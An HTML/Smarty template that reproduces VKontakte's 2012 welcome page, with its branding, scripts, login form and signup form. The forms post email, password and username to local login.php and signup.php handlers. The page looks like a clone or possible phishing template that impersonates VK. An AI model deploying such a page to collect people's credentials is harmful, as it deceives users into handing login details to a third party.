<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="shortcut icon" href="images/faviconnew.ico">

<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="description" content="&lt;b&gt;ВКонтакте&lt;/b&gt; – универсальное средство для коммуникации и поиска людей,&lt;br&gt;которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">

<title>Добро пожаловать</title>

<noscript><meta http-equiv="refresh" content="0; URL=/badbrowser.php"></noscript>

{literal}<script type="text/javascript">
var vk = {
  ad: 1,
  adupd: 120000, // 2 min
  al: parseInt('3') || 4,
  id: 0,
  intnat: '' ? true : false,
  host: 'vk.com',
  lang: 0,
  rtl: parseInt('') || 0,
  version: 9502,
  stDomains: 3,
  zero: false,
  contlen: 6322,
  loginscheme: 'https',
  ip_h: '26b28150fee46ce5c5',
  vc_h: '47d2fc7abc4e114a6fc9fd7dc066fbbe',
  navPrefix: '/',
  dt: parseInt('') || 0,
  fs: parseInt('11') || 11,
  ts: 1341155791,
  pd: 0,
  time: [2012, 7, 1, 19, 16, 31]
}

window.locDomain = vk.host.match(/[a-zA-Z]+\.[a-zA-Z]+\.?$/)[0];
var _ua = navigator.userAgent.toLowerCase();
if (/opera/i.test(_ua) || !/msie 6/i.test(_ua) || document.domain != locDomain) document.domain = locDomain;
var ___htest = (location.toString().match(/#(.*)/) || {})[1] || '';
if (vk.al != 1 && ___htest.length && ___htest.substr(0, 1) == vk.navPrefix) {
  if (vk.al != 3 || vk.navPrefix != '!') {
    location.replace(location.protocol + '//' + location.host + '/' + ___htest.replace(/^(\/|!)/, ''));
  }
}

var StaticFiles = {
  'common.js' : {v: 853},
  'common.css': {v: 322},
  'ie6.css'   : {v: 22},
  'ie7.css'   : {v: 16}
  ,'lang0_0.js':{v:6265},'index.css':{v:19}
}
</script>{/literal}

<link rel="stylesheet" type="text/css" href="/css/al/common.css">
<link type="text/css" rel="stylesheet" href="/css/al/index.css">
<script type="text/javascript" src="/js/loader_nav9502_0.js"></script>
<script type="text/javascript" src="/js/al/common.js"></script>
<script type="text/javascript" src="/js/lang0_0.js"></script>

<script src="/js/al/index.js" type="text/javascript"></script></head>

<body onresize="onBodyResize()" class="is_rtl font_default firefox">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"><div id="common_css"></div><div id="index_css"></div></div>

  <div style="height: 796px;" id="layer_bg" class="fixed"></div><div style="width: 1440px; height: 796px;" id="layer_wrap" class="scroll_fix_wrap fixed"><div style="width: 1422px;" id="layer"></div></div>
  <div style="height: 796px;" id="box_layer_bg" class="fixed"></div><div style="width: 1440px; height: 796px;" id="box_layer_wrap" class="scroll_fix_wrap fixed"><div style="width: 1422px;" id="box_layer"><div id="box_loader"><div class="loader"></div><div class="back"></div></div></div></div>

  <div style="left: 0px; width: 316px; height: 796px; opacity: 0;" class="fixed" id="stl_left"><div id="stl_bg"><nobr id="stl_text">Наверх</nobr></div></div><div style="left: 316px; width: 140px; top: 221px; height: 575px;" class="fixed" id="stl_side"></div>

  <script type="text/javascript">domStarted();</script>

  <div class="scroll_fix_wrap" id="page_wrap">
<div><div style="width: 1422px;" class="scroll_fix">
  <div id="page_layout" style="width: 791px;">
    <div id="page_header" class="p_head p_head_l0">
      <div class="back"></div>
      <div class="left"></div>
      <div class="right"></div>
      <div class="content">
        <div id="top_nav" class="head_nav">
  <div id="top_logo_down" class="fl_l"></div>
  <a id="top_home_link" class="top_home_link fl_l" href="/"  style=""></a>
  <div id="top_links">
    <div class="fl_r" id="top_menu_wrap" style="display: none">
      <a id="top_reg_link" class="fl_r top_nav_link" href="/join" style="display: none;" >регистрация</a>
    </div>
    <a class="fl_l top_nav_link" href="" id="top_back_link" ></a>
  </div>
</div>
      </div>
    </div>

    <div id="side_bar" class="fl_l" style="">
           <div id="quick_login">
       <form action='login.php' name="login" id="login" method='post'>
    <div class="label">E-mail или Логин:</div>
    <div class="labeled"> <input type='text' class='text' name='email' size='20' maxlength='100' value='{$prev_email}'></div>

    <div class="label">Пароль:</div>
    <div class="labeled"><input type='password' class='text' name='password' size='20' maxlength='100'></div>
    <div class="checkbox" id="quick_expire" onclick="checkbox(this);ge(&#39;quick_expire_input&#39;).value=isChecked(this)?1:&#39;&#39;;" style="display: block; "><div></div>Чужой компьютер</div>
       <div class="button_blue button_wide"><button id="quick_login_button">Войти</button></div>
  <div class="clear forgot"><a href="lostpass.php" target="_top">Забыли пароль?</a></div>

  <input type="hidden" name="task" value="dologin">
      <input type="hidden" name="ip" value="93.125.112.4">

  </form>
  </div>
    </div>

    <div id="page_body" class="fl_r" style="width: 631px;">
      <div id="header_wrap2">
        <div id="header_wrap1">
          <div id="header" style="">
            <h1 id="title">Добро пожаловать</h1>
          </div>
        </div>
      </div>
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
    <div id="content"><div id="index">
  <iframe class="upload_frame" src="home_files/a.htm"></iframe>
  <div class="content">
    <p><b>ВКонтакте</b> – универсальное средство для коммуникации и поиска людей,<br>которым ежедневно пользуются десятки миллионов человек.</p>

    <h2>Моментальная регистрация</h2>

    <div class="msg" id="ij_msg"></div>

   <form action='signup.php' method='POST'>

<div class="ij_form">
 <div class="ij_reg_row">
 <input name='signup_email' type='text'  class="text" placeholder="Email адрес" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" value='' required/>
</div>

 <div class="ij_reg_row">
 <input name='signup_password' type='password'  class="text" placeholder="Пароль" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" value=''  required/>
</div>

 <div class="ij_reg_row">
 <input name='signup_password2' type='password'  class="text" placeholder="Повторите Пароль" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" value='' required/>
 </div>

 <div class="ij_reg_row">
 <input name='signup_username' type='text'  class="text"  placeholder="Логин" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" value='' required/>
</div>


  {if $setting.setting_signup_code}
<div class="ij_reg_row">
      <input type="text" class="text" name="captcha" id="captcha-form" required autocomplete="off" placeholder="Защитный код" /><br><br>
	  <a href="javascript:void(0);" onclick="document.getElementById('captcha').src='captcha.php?'+Math.random(); document.getElementById('captcha-form').focus();" id="change-image"><img src='./captcha.php' id="captcha" border='0' class='signup_code'></a>
            </div>

    {/if}
      <div class="ij_reg_row" id="ij_sex_row">
        <input type="hidden" id="ij_sex" name="ij_sex" />
      </div>
      <div class="button_blue button_wide button_big ij_button">
        <button>
          <span class="ij_with_arr">Зарегистрироваться</span>
        </button>
     </div>
	<input type='hidden' name='task' value='step1do'>
 <input type='hidden' name='step' value='1'>
 </div>
 </form>

    <h2>В чём поможет ВКонтакте?</h2>
    <ul class="listing">
      <li><span>Найти людей, с которыми Вы когда-либо учились, работали или отдыхали.</span></li>
      <li><span>Узнать больше о людях, которые Вас окружают, и найти новых друзей.</span></li>
      <li><span>Всегда оставаться в контакте с теми, кто Вам дорог.</span></li>
    </ul>
  </div>
</div></div>
  </div>
</div></div>
    </div>


{include file='footer.tpl'}

  <div>


  </div>
</div>
    </div>
    <div class="clear"></div>
  </div>
</div></div></div>
  <div class="progress" id="global_prg"></div>

 {literal} <script type="text/javascript">
    if (parent && parent != window && (browser.msie || browser.opera || browser.mozilla || browser.chrome || browser.safari || browser.iphone)) {
      document.getElementsByTagName('body')[0].innerHTML = '';
    } else {
      domReady();
      updateMoney(0);
gSearch.init();
if (window.qArr && qArr[5]) qArr[5] = [5, "по товарам", "", "goods", 0x00000100];
if (browser.iphone || browser.ipad || browser.ipod) {
  setStyle(bodyNode, {webkitTextSizeAdjust: 'none'});
}var qf = ge('quick_login_form'), ql = ge('quick_login'), qe = ge('quick_email'), qp = ge('quick_pass');
var qlb = ge('quick_login_button'), prgBtn = qlb;

var qinit = function() {
  setTimeout(function() {
    ql.insertBefore(ce('div', {innerHTML: '<iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe>'}), qf);
    qf.target = 'quick_login_frame';
  }, 1);
}

if (window.top && window.top != window) {
  window.onload = qinit;
} else {
  setTimeout(qinit, 0);
}

qf.onsubmit = function() {
  if (!ge('quick_login_frame')) return false;
  if (!trim(qe.value)) {
    elfocus(qe);
    return false;
  } else if (!trim(qp.value)) {
    elfocus(qp);
    return false;
  }
  lockButton(window.__qfBtn = prgBtn);
  prgBtn = qlb;
  return true;
}

window.focusLoginInput = function() {
  scrollToTop(0);
  notaBene('quick_email');
}
window.changeQuickRegButton = function(noShow) {
  if (noShow) {
    hide('top_reg_link', 'quick_reg_button');
    show('top_search_link');
  } else {
    hide('top_search_link');
    show('top_reg_link', 'quick_reg_button');
  }
}
window.submitQuickLoginForm = function(email, pass, opts) {
  setQuickLoginData(email, pass, opts);
  if (opts && opts.prg) prgBtn = opts.prg;
  if (qf.onsubmit()) qf.submit();
}
window.setQuickLoginData = function(email, pass, opts) {
  if (email !== undefined) ge('quick_email').value = email;
  if (pass !== undefined) ge('quick_pass').value = pass;
  var params = opts && opts.params || {};
  for (var i in params) {
    var el = ge('quick_login_' + i);
    if (el) {
      val(el, params[i]);
    } else {
      qf.appendChild(ce('input', {type: 'hidden', name: i, id: 'quick_login_' + i, value: params[i]}));
    }
  }
}

if (qlb) {
  qlb.onclick = function() { if (qf.onsubmit()) qf.submit(); };
}

if (browser.opera_mobile) show('quick_expire');

if (1) {
  hide('support_link_td');
}
var ts_input = ge('ts_input'), oldFF = browser.mozilla && parseInt(browser.version) < 8;
if (browser.mozilla && !oldFF) {
  setStyle(ts_input, {padding: (vk.rtl ? '3px 22px 4px 40px' : '3px 41px 4px 22px')});
}
placeholderSetup(ts_input, {back: false, reload: true});
if (browser.opera || browser.msie || oldFF) {
  setStyle(ts_input, {padding: (vk.rtl ? '3px 22px 4px 40px' : '3px 41px 4px 22px')});
}
if (browser.chrome) {
  setStyle(ts_input, {padding: (vk.rtl ? '4px 23px 3px 39px' : '4px 40px 3px 23px')});
}
TopSearch.init();
if (browser.msie8 || browser.msie7) {
  var st = {border: '1px solid #a6b6c6'};
  if (hasClass(ge('ts_wrap'), 'vk')) {
    if (vk.rtl) st.left = '1px';
    else st.right = '0px';
  } else {
    if (vk.rtl) st.right = '146px';
    else st.left = '146px';
  }
  setStyle(ge('ts_cont_wrap'), st);
}
window.tsHintsEnabled = 1;
handlePageParams({"id":0,"loc":"","notopmenu":1,"wrap_page":1,"width":791,"width_dec":160,"width_dec_footer":130,"pvbig":0,"pvdark":1});addEvent(document, 'click', onDocumentClick);;stManager.add(["index.js"], function () {Index.initNew();
JoinPhotoview.init([{"src":"\/images\/join\/dial_1.png?1","width":790,"height":600,"desc":"Делитесь с друзьями фотографиями и новостями"},{"src":"\/images\/join\/news_1.png?1","width":790,"height":600,"desc":"Получайте новости из жизни Ваших друзей и известных людей"},{"src":"\/images\/join\/photos_1.png?1","width":790,"height":600,"desc":"Общайтесь с близкими при помощи личных сообщений"}]);
cur.lang = extend(cur.lang || {}, {
  index_screen_m_of_n: 'Иллюстрация {num} из {count}',
  index_to_main: 'Главная страница',
  index_choose_sex: 'Укажите пол'
});
var sd = false;
if (sd) Index.initSexDD(sd);
placeholderSetup('ij_first_name', {back: true});
placeholderSetup('ij_last_name', {back: true});
var login = ge('quick_email');
if (login) {
  login.focus();
}});;if (browser.msie) stManager.add('pinbar.js', function() {window.initPinBar('/id', '/im');});
    }
function _test(){}
  </script>{/literal}


</body></html>